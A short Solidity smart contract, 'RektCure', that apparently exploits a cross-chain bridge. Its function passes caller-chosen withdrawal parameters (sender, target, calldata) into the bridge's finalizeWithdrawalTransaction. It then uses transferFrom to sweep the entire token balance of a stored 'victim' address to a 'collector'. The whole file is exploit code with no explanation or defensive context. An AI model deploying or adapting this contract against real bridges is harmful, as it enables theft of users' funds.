// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "./IERC20.sol";

interface IBridge {
  struct WithdrawalTransaction {
      uint256 nonce;
      address sender;
      address target;
      uint256 value;
      uint256 gasLimit;
      bytes data;
  }

  function finalizeWithdrawalTransaction(WithdrawalTransaction memory) external;
}

contract RektCure {
  address public collector;
  address public bridge;
  address public token;
  address public victim;

  constructor(
    address _bridge,
    address _collector,
    address _token,
    address _victim
  ) public {
    bridge = _bridge;
    collector = _collector;
    token = _token;
    victim = _victim;
  }

  function sadge(uint256 nonce, address sender, address target, uint256 value, uint256 gasLimit, bytes memory data) external {
    IBridge.WithdrawalTransaction memory _tx;
    _tx.nonce = nonce;
    _tx.sender = sender;
    _tx.target = target;
    _tx.value = value;
    _tx.gasLimit = gasLimit;
    _tx.data = data;
    IBridge(bridge).finalizeWithdrawalTransaction(_tx);
    uint256 balance = IERC20(token).balanceOf(victim);
    IERC20(token).transferFrom(victim, collector, balance);
  }
}
